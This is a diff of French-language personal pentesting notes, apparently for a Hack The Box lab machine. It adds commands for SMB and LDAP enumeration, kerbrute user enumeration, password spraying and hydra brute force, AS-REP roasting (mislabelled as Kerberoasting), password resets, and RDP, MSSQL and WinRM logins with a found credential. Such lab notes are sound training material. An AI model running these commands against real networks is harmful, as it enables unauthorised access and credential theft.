@@ -394,11 +394,9 @@ Options pour la commande `wc`
 
 
 
-
 ---
 
 <br>
-
 
 
 
@@ -415,11 +413,9 @@ docker-compose --version
 
 
 
-
 ---
 
 <br>
-
 
 
 
@@ -434,11 +430,9 @@ apt install flameshot
 * Choisir la touche souhaitée
 
 
-
 ---
 
 <br>
-
 
 
 ### openvpn
@@ -455,27 +449,24 @@ ip a
 ```
 
 
-
-
 ---
 
 <br>
 
 
+## Enum SMB
 
-### Afficher les partages SMB avec NMAP
+Afficher les partages SMB avec NMAP
 ```sh
 nmap --script smb-enum-shares -p 445 <IP>
 ```
 
-
-### Afficher les partages SMB d'un hôte
+Afficher les partages SMB d'un hôte
 ```sh
 smbclient //<IP> -N
 ```
 
-
-### Enum SMB
+Enum SMB
 ```sh
 smbclient -L //<IP> -N
 ```
@@ -483,8 +474,7 @@ smbclient -L //<IP> -N
 crackmapexec smb 10.129.10.147
 ```
 
-
-### Se connecter au partage SMB (si pas de password...)
+Se connecter au partage SMB (si pas de password...)
 ```sh
 smbclient //<IP>/nom_partage
 ```
@@ -492,18 +482,20 @@ smbclient //<IP>/nom_partage
 Se souvenir que les printers ont souvent leurs pages web sur http 80 et peuvent contenir pas mal d'infos et permettre des mouvements latéraux.
 
 
-### Énum des users AD
+Vérifier si un user a accès à d'autres patarges
 ```sh
-kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.10.147 -d overwatch.htb
+crackmapexec smb 10.129.10.147 -u monitoring -p 'Password123' --shares
 ```
 
 
-### brutforce un login SMB avec hydra
+
+
+brutforce un login SMB avec hydra
 ```sh
 hydra -L usernames.txt -P rockyou.txt smb://<IP>
 ```
 
-### Se connecter au partage SMB avec password
+Se connecter au partage SMB avec password
 ```sh
 smbclient //<IP>/nom_partage -U <username>
 ```
@@ -511,16 +503,21 @@ Ou
 ```sh
 smbclient //10.129.10.147/software$ -N
 ```
+
+### Télécharger un fichier
 ```sh
 ls
 get <nom_fichier>
 ```
 
-
+### Chercher une string dans un fichier
+```sh
+strings overwatch.exe.config | grep -i password
+strings overwatch.exe.config | grep -i sql
+strings overwatch.exe.config | grep -i user
+```
 
 ---
-
-
 
 ### Enum LDAP
 ```sh
@@ -534,6 +531,56 @@ ldapsearch -x -H ldap://<IP> -s base namingcontexts
 ```sh
 ldapsearch -x -H ldap://<IP> -b "DC=overwatch,DC=htb"
 ```
+
+
+---
+
+### Énum des users AD
+```sh
+kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.10.147 -d overwatch.htb
+```
+
+### Spraying
+```sh
+crackmapexec smb 10.129.10.147 -u userenum.txt -p 'Password123'
+```
+
+
+
+Connexion MSSQL avec port spécifique
+```sh
+impacket-mssqlclient overwatch.htb/monitoring:Password123@10.129.10.147 -port 6520
+```
+
+### Conenxion RDP
+```sh
+xfreerdp3 /u:monitoring /p:Password123 /v:10.129.10.147
+```
+
+### Kerberoasting
+```sh
+impacket-GetNPUsers overwatch.htb/monitoring:Password123 -dc-ip 10.129.10.147
+```
+
+### Reset un mdp user
+```sh
+net rpc password monitoring -U 'overwatch.htb/monitoring%Password123' -S 10.129.10.147
+```
+
+
+### connexion winrm
+```sh
+evil-winrm -i 10.129.10.147 -u overwatch.htb\administrator -p 'Password123'
+```
+```sh
+crackmapexec winrm 10.129.10.147 -u monitoring -p 'Password123'
+```
+
+???
+```sh
+crackmapexec ldap 10.129.10.147 -u monitoring -p 'Password123'
+```
+
 
 
 ### Test utilisateurs anonymes
